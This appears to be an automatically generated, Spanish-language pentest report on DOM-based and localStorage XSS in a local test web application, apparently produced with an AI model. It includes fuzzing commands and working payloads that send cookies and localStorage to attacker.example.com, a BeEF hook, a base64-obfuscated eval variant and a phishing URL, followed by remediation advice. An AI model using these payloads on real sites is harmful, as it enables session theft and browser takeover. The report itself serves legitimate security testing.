# Informe de XSS — Entorno Kali / GPT-5 mini

Fecha: 2026-04-16T11:09:37Z
Objetivo: http://web.dev.local:8082

Resumen ejecutivo
-----------------
Se han identificado vulnerabilidades de Cross-Site Scripting (XSS) en la aplicación objetivo. Tipo: DOM-based XSS (reflejado vía parámetro `search`) y Stored/DOM XSS (comentarios almacenados en localStorage, renderizados sin escape). Impacto: ejecución remota de JavaScript en el navegador de la víctima, posible robo de cookies/localStorage y carga de hooks externos (BeEF).

Evidencias (fragmentos relevantes)
----------------------------------
En el HTML retornado se observan estas líneas JavaScript sin escape:

```js
// Handle search query
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
...
if (searchTerm) {
    document.write('<div class="result" ...>');
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    ...
}

// Comments
const name = urlParams.get('name');
const comment = urlParams.get('comment');
if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;
}

function displayComments() {
    const comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.forEach(function(c) {
        document.write('<div class="comment">');
        document.write('<div class="comment-author">' + c.name + '</div>');
        document.write('<div>' + c.comment + '</div>');
        document.write('<small>' + c.date + '</small>');
        document.write('</div>');
    });
}
```

Análisis
--------
- Reflected/DOM XSS: El parámetro `search` se toma desde window.location.search y se inyecta con `document.write()` dentro del DOM sin escape. Un atacante puede enviar una URL que incluya JavaScript (p.ej. `<script>alert(1)</script>`), que será interpretado por el navegador de la víctima cuando visite la URL.

- Stored-like DOM XSS (localStorage): El formulario de comentarios guarda `name` y `comment` en localStorage sin sanitizar y luego los renderiza con `document.write()`. Cualquier visitante que almacene un payload malicioso verá ejecutado el script cuando se rendericen los comentarios.

Comandos de reconocimiento y fuzzing (ejemplos)
------------------------------------------------
- Revisión inicial con curl (no ejecuta JS, sirve para ver el HTML):
  curl -s -i http://web.dev.local:8082/

- Prueba rápida de payload (navegador real / headless necesario para ejecutar JS):
  Visit: http://web.dev.local:8082/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E

- Envío de comentario vulnerable (simula posting):
  http://web.dev.local:8082/?name=Attacker&comment=%3Cscript%3Ealert("xss")%3C%2Fscript%3E

- Tools (comandos sugeridos para auditoría automatizada):
  dalfox url "http://web.dev.local:8082/?search=FUZZ" -b -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Brute.txt
  python3 /usr/share/XSStrike/xsstrike.py -u "http://web.dev.local:8082/?search=FUZZ" --crawl 1
  ffuf -u http://web.dev.local:8082/?search=FUZZ -w /usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-Brute.txt

Payloads de explotación (prácticos)
-----------------------------------
1) Exfiltración de cookies (payload directo):
   <script>new Image().src='http://attacker.example.com:9000/?c='+encodeURIComponent(document.cookie)</script>

2) Exfiltración de localStorage (ej. token):
   <script>fetch('http://attacker.example.com:9000/exf',{method:'POST',body:JSON.stringify({ls:localStorage})})</script>

3) BeEF hook (control remoto del navegador):
   <script src="http://attacker.example.com:3000/hook.js"></script>

4) Evasión / ofuscación por Base64:
   <script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vYXR0YWNrZXIuZXhhbXBsZS5jb206OTAwMC8/Yz0nK2VuY29kVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk='))</script>
   (la cadena decodifica el payload de exfiltración)

Simulación de explotación (pasos)
---------------------------------
1. Atacante publica URL maliciosa o envía link por phishing: 
   http://web.dev.local:8082/?search=%3Cscript%3Enew%20Image().src%3D'http%3A%2F%2Fattacker.example.com%3A9000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%3C%2Fscript%3E
2. Víctima abre la URL en su navegador; la página ejecuta el script y el navegador realiza una petición HTTP GET al servidor del atacante con las cookies.
3. Si el atacante controla attacker.example.com:9000, registra el parámetro y obtiene las cookies/tokens.

Nota: La prueba real requiere un navegador (o headless) para ejecutar JS. En este entorno se validó la presencia del vector en el código fuente y se construyeron payloads funcionales; la ejecución práctica requiere un navegador víctima o un entorno headless (puppeteer/playwright).

Impacto
-------
- Robo de sesiones (si las cookies de sesión no están marcadas HttpOnly).
- Robo de tokens en localStorage.
- Posible ejecución de acciones en nombre de la víctima.
- Compromiso completo del cliente si se carga un hook BeEF u otro script de control.

Recomendaciones
---------------
1. Evitar document.write() y concatenaciones inseguras; usar textContent o createTextNode para insertar contenido de usuario.
2. Escapar/normalizar cualquier dato proveniente de URL antes de insertarlo en DOM.
3. Aplicar Content Security Policy (CSP) restrictiva (prohibir inline scripts y cargar sólo desde orígenes de confianza).
4. Marcar cookies sensibles como HttpOnly y Secure; minimizar almacenamiento de tokens en localStorage.
5. Validación y sanitización del lado servidor y cliente.

Pruebas sugeridas para validación
--------------------------------
- Usar un navegador con DevTools para cargar la URL con el payload y verificar que se realiza la petición de exfiltración.
- Ejecutar un headless test con Puppeteer:
  const puppeteer = require('puppeteer');
  (abrir la URL maliciosa y observar requests)

Conclusión
----------
Se confirma la presencia de XSS basado en DOM en dos vectores principales (parámetro `search` y sistema de comentarios basado en localStorage). Los payloads anteriores permitirían exfiltrar cookies/localStorage y cargar hooks externos. Se recomienda corregir las vulnerabilidades con urgencia.

---
Generado por: Auditor automatizado (Kali-like) + GPT-5 mini
